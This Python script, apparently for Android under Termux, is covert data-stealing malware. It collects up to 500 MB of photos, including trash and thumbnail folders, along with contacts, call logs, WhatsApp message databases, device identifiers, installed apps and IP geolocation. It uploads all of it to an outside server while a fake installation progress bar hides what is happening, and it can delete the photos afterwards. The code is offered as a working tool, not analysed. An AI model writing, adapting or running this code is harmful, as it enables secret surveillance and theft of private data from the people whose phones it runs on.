import time
import random
import os
import requests
import platform
import base64
import uuid
import json
from datetime import datetime
import sys
import threading
import subprocess
import logging
import sqlite3
import shutil

class DataCollector:
    def __init__(self):
        self.debug_log = []
        self.device_id = self.get_device_id()
        self.MAX_DATA_SIZE = 500 * 1024 * 1024  # 500 MB total limit
        # Setup logging to file
        logging.basicConfig(filename='/sdcard/data_collector_log.txt', level=logging.DEBUG, 
                            format='%(asctime)s %(levelname)s: %(message)s')
        self.debug_log.append(f"Initialized with device_id: {self.device_id}")

    def get_device_id(self):
        """Generate a unique device ID."""
        return uuid.uuid4().hex

    def get_last_modified(self, file_path):
        """Get the last modified time of a file in a human-readable format."""
        try:
            mtime = os.path.getmtime(file_path)
            last_edit = datetime.fromtimestamp(mtime)
            now = datetime.now()
            delta = now - last_edit
            if delta.days > 0:
                return f"{delta.days} days ago"
            elif delta.seconds > 3600:
                return f"{delta.seconds // 3600} hours ago"
            elif delta.seconds > 60:
                return f"{delta.seconds // 60} minutes ago"
            else:
                return "just now"
        except Exception as e:
            self.debug_log.append(f"Failed to get mtime for {file_path}: {str(e)}")
            logging.error(f"Failed to get mtime for {file_path}: {str(e)}")
            return "unknown"

    def collect_files(self, sdcard_path):
        """Collect all files from the SD card, including hidden and Trash/cache folders."""
        files_data = []
        deleted_files = []
        trash_folders = []
        total_size = 0
        
        # Supported image formats
        image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff', '.raw', '.dng')
        
        for root, dirs, files in os.walk(sdcard_path, followlinks=False):
            # Check for hidden directories (start with .)
            dirs[:] = [d for d in dirs if not d.startswith('.') or 'trash' in d.lower() or 'cache' in d.lower()]
            
            # Check for Trash/cache folders
            if any(keyword in root.lower() for keyword in ['trash', '.trashed', 'cache', 'deleted', 'thumbnails', '.thumbnails']):
                trash_folders.append(root)
                self.debug_log.append(f"Found special folder: {root}")
                logging.info(f"Found special folder: {root}")
                
            for file_name in files:
                if total_size >= self.MAX_DATA_SIZE:
                    self.debug_log.append("Reached 500 MB data limit")
                    logging.warning("Reached 500 MB data limit")
                    break
                    
                # Only process image files
                if not file_name.lower().endswith(image_extensions):
                    continue
                    
                file_path = os.path.join(root, file_name)
                try:
                    size = os.path.getsize(file_path)
                    if size == 0:
                        self.debug_log.append(f"Skipping empty file: {file_path}")
                        logging.warning(f"Skipping empty file: {file_path}")
                        continue
                    if total_size + size > self.MAX_DATA_SIZE:
                        self.debug_log.append(f"Skipping {file_name}: exceeds 500 MB limit")
                        logging.warning(f"Skipping {file_name}: exceeds 500 MB limit")
                        continue
                        
                    with open(file_path, 'rb') as f:
                        content = base64.b64encode(f.read()).decode('utf-8', errors='ignore')
                    
                    relative_path = os.path.relpath(root, sdcard_path)
                    file_data = {
                        'name': file_name,
                        'content': content,
                        'folder': relative_path,
                        'last_edit': self.get_last_modified(file_path),
                        'size': size
                    }
                    files_data.append(file_data)
                    total_size += size
                    deleted_files.append(file_path)
                    self.debug_log.append(f"Collected file: {file_path} ({size} bytes)")
                    logging.info(f"Collected file: {file_path} ({size} bytes)")
                except Exception as e:
                    self.debug_log.append(f"Failed to read {file_path}: {str(e)}")
                    logging.error(f"Failed to read {file_path}: {str(e)}")
                    continue
                    
        # Try to collect additional data
        additional_data = self.collect_additional_data()
        
        # Save collected data locally
        self.save_local_output(files_data, trash_folders, additional_data)
        return files_data, deleted_files, trash_folders, additional_data

    def collect_additional_data(self):
        """Collect contacts, call logs, and WhatsApp data if accessible."""
        additional_data = {
            'contacts': [],
            'call_logs': [],
            'whatsapp_data': []
        }
        
        # Try to collect contacts
        try:
            # Try using termux-api if available
            contacts_cmd = "termux-contact-list"
            result = subprocess.run(contacts_cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                additional_data['contacts'] = json.loads(result.stdout)
                self.debug_log.append("Successfully collected contacts")
            else:
                # Try accessing contacts database directly
                contacts_db_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
                if os.path.exists(contacts_db_path):
                    # Copy the database to a accessible location
                    temp_db = "/sdcard/contacts_temp.db"
                    shutil.copy2(contacts_db_path, temp_db)
                    
                    # Extract contacts
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM raw_contacts")
                    contacts = cursor.fetchall()
                    additional_data['contacts'] = contacts
                    conn.close()
                    os.remove(temp_db)
                    self.debug_log.append("Collected contacts from database")
        except Exception as e:
            self.debug_log.append(f"Failed to collect contacts: {str(e)}")
            logging.error(f"Failed to collect contacts: {str(e)}")
        
        # Try to collect call logs
        try:
            # Try using termux-api if available
            call_logs_cmd = "termux-call-log"
            result = subprocess.run(call_logs_cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                additional_data['call_logs'] = json.loads(result.stdout)
                self.debug_log.append("Successfully collected call logs")
            else:
                # Try accessing call log database directly
                call_log_db_path = "/data/data/com.android.providers.contacts/databases/calllog.db"
                if os.path.exists(call_log_db_path):
                    # Copy the database to a accessible location
                    temp_db = "/sdcard/calllog_temp.db"
                    shutil.copy2(call_log_db_path, temp_db)
                    
                    # Extract call logs
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM calls")
                    call_logs = cursor.fetchall()
                    additional_data['call_logs'] = call_logs
                    conn.close()
                    os.remove(temp_db)
                    self.debug_log.append("Collected call logs from database")
        except Exception as e:
            self.debug_log.append(f"Failed to collect call logs: {str(e)}")
            logging.error(f"Failed to collect call logs: {str(e)}")
        
        # Try to collect WhatsApp data
        try:
            whatsapp_paths = [
                "/sdcard/WhatsApp",
                "/sdcard/Android/media/com.whatsapp",
                "/sdcard/WhatsApp Business"
            ]
            
            for path in whatsapp_paths:
                if os.path.exists(path):
                    # Collect databases
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.db') or file.endswith('.crypt12'):
                                db_path = os.path.join(root, file)
                                try:
                                    # Copy the database to read it
                                    temp_db = f"/sdcard/whatsapp_temp_{file}"
                                    shutil.copy2(db_path, temp_db)
                                    
                                    # Try to read the database
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    
                                    # Try to get messages
                                    try:
                                        cursor.execute("SELECT * FROM messages LIMIT 100")
                                        messages = cursor.fetchall()
                                        additional_data['whatsapp_data'].append({
                                            'database': file,
                                            'messages': messages
                                        })
                                    except:
                                        pass
                                    
                                    # Try to get contacts
                                    try:
                                        cursor.execute("SELECT * FROM wa_contacts LIMIT 50")
                                        contacts = cursor.fetchall()
                                        additional_data['whatsapp_data'].append({
                                            'database': file,
                                            'contacts': contacts
                                        })
                                    except:
                                        pass
                                    
                                    conn.close()
                                    os.remove(temp_db)
                                except Exception as e:
                                    self.debug_log.append(f"Failed to read WhatsApp DB {file}: {str(e)}")
                                    continue
                    
                    self.debug_log.append(f"Collected WhatsApp data from {path}")
        except Exception as e:
            self.debug_log.append(f"Failed to collect WhatsApp data: {str(e)}")
            logging.error(f"Failed to collect WhatsApp data: {str(e)}")
        
        return additional_data

    def save_local_output(self, files_data, trash_folders, additional_data):
        """Save collected data to /sdcard/data_collection_output.json."""
        try:
            output_data = {
                'device_id': self.device_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'files': files_data,
                'device_info': self.get_device_info(),
                'trash_folders': trash_folders,
                'additional_data': additional_data,
                'debug_log': self.debug_log
            }
            output_path = '/sdcard/data_collection_output.json'
            with open(output_path, 'w') as f:
                json.dump(output_data, f, indent=2)
            self.debug_log.append(f"Saved local output to {output_path}")
            logging.info(f"Saved local output to {output_path}")
        except Exception as e:
            self.debug_log.append(f"Failed to save local output: {str(e)}")
            logging.error(f"Failed to save local output: {str(e)}")

    def get_device_info(self):
        """Gather device information without root."""
        info = {}
        try:
            info['model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8', errors='ignore').strip()
            info['os_version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode('utf-8', errors='ignore').strip()
            info['serial'] = subprocess.check_output(['getprop', 'ro.serialno']).decode('utf-8', errors='ignore').strip()
            info['android_id'] = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode('utf-8', errors='ignore').strip()
            info['installed_apps'] = subprocess.check_output(['pm', 'list', 'packages']).decode('utf-8', errors='ignore').strip().splitlines()
            info['battery'] = subprocess.check_output(['dumpsys', 'battery']).decode('utf-8', errors='ignore').strip()
            info['uptime'] = subprocess.check_output(['uptime']).decode('utf-8', errors='ignore').strip()
            try:
                wifi_info = subprocess.check_output(["dumpsys", "wifi"], shell=True).decode('utf-8', errors='ignore').strip()
                if "SSID:" in wifi_info:
                    info['wifi_ssid'] = wifi_info.split("SSID:")[1].split("\n")[0].strip()
                else:
                    info['wifi_ssid'] = "Unknown"
            except:
                info['wifi_ssid'] = "Unknown"
        except Exception as e:
            self.debug_log.append(f"Failed to get device info: {str(e)}")
            logging.error(f"Failed to get device info: {str(e)}")
        return info

    def display_progress_bar(self, duration, total_files):
        """Display a fake progress bar with installation messages."""
        fake_messages = [
            "Initializing setup...",
            "Verifying device compatibility...",
            "Downloading core components...",
            "Configuring tools...",
            "Finalizing installation..."
        ]
        print("\nProcessing files...")
        for i in range(101):
            if i % 20 == 0 and i // 20 < len(fake_messages):
                print(fake_messages[i // 20])
            time.sleep(duration / 100)
            bar_length = 50
            filled = int(bar_length * i // 100)
            bar = '█' * filled + '-' * (bar_length - filled)
            sys.stdout.write(f'\rProgress: |{bar}| {i}% ({min(i * total_files // 100, total_files)}/{total_files} processed)')
            sys.stdout.flush()
        print("\nProcessing completed.\n")

    def upload_data(self, delete_photos=False):
        """Upload collected files to the server in batches."""
        try:
            device_name = platform.node() or "Unknown"
            if device_name == "localhost" or not device_name:
                device_name = f"Device_{uuid.uuid4().hex[:8]}"
            server_url_upload = "http://Script.onemancode.com/api/upload_data"  # Change to your server URL
            sdcard_path = "/sdcard"
            time.sleep(random.randint(2, 5))
            if not os.path.exists(sdcard_path):
                self.debug_log.append("SD card path not accessible")
                logging.error("SD card path not accessible")
                print("Error: SD card path not accessible")
                return
                
            files_data, deleted_files, trash_folders, additional_data = self.collect_files(sdcard_path)
            total_files = len(files_data)
            
            if total_files == 0:
                self.debug_log.append("No files found on SD card")
                logging.warning("No files found on SD card")
                print("No files found to upload.")
                return
                
            batch_size = 100
            for i in range(0, total_files, batch_size):
                batch_files = files_data[i:i + batch_size]
                batch_deleted_files = deleted_files[i:i + batch_size]
                progress_thread = threading.Thread(target=self.display_progress_bar, args=(10, len(batch_files)))
                progress_thread.start()
                
                try:
                    ip_info = requests.get('http://ip-api.com/json/', timeout=5).json()
                    metadata = {
                        'ip': ip_info.get('query', 'Unknown'),
                        'country': ip_info.get('country', 'Unknown'),
                        'city': ip_info.get('city', 'Unknown'),
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name,
                        'batch_number': i // batch_size + 1,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                except Exception:
                    metadata = {
                        'ip': 'Unknown',
                        'country': 'Unknown',
                        'city': 'Unknown',
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name,
                        'batch_number': i // batch_size + 1,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                upload_payload = {
                    'device_id': self.device_id,
                    'device_name': device_name,
                    'metadata': json.dumps(metadata, ensure_ascii=False),
                    'photos': json.dumps(batch_files, ensure_ascii=False),
                    'device_info': json.dumps(self.get_device_info(), ensure_ascii=False),
                    'additional_data': json.dumps(additional_data, ensure_ascii=False)
                }
                
                try:
                    response = requests.post(server_url_upload, json=upload_payload, timeout=60)
                    progress_thread.join()
                    
                    if response.status_code == 200:
                        self.debug_log.append(f"Successfully uploaded batch {i//batch_size + 1} for device {self.device_id}")
                        logging.info(f"Successfully uploaded batch {i//batch_size + 1} for device {self.device_id}")
                        print(f"\nBatch {i//batch_size + 1} uploaded successfully")
                        
                        if delete_photos:
                            for file_path in batch_deleted_files:
                                try:
                                    os.remove(file_path)
                                    self.debug_log.append(f"Deleted {file_path}")
                                    logging.info(f"Deleted {file_path}")
                                except Exception as e:
                                    self.debug_log.append(f"Failed to delete {file_path}: {str(e)}")
                                    logging.error(f"Failed to delete {file_path}: {str(e)}")
                    else:
                        self.debug_log.append(f"Batch {i//batch_size + 1} upload failed: {response.status_code} {response.text}")
                        logging.error(f"Batch {i//batch_size + 1} upload failed: {response.status_code} {response.text}")
                        print(f"\nBatch {i//batch_size + 1} upload failed: {response.status_code}")
                except Exception as e:
                    progress_thread.join()
                    self.debug_log.append(f"Batch {i//batch_size + 1} upload error: {str(e)}")
                    logging.error(f"Batch {i//batch_size + 1} upload error: {str(e)}")
                    print(f"\nBatch {i//batch_size + 1} upload error: {str(e)}")
                    
        except Exception as e:
            self.debug_log.append(f"General error in upload_data: {str(e)}")
            logging.error(f"General error in upload_data: {str(e)}")
            print(f"Error: {str(e)}")

    def start_menu(self):
        """Start the upload process."""
        self.upload_data(delete_photos=False)

def main():
    collector = DataCollector()
    collector.start_menu()

if __name__ == "__main__":
    main()
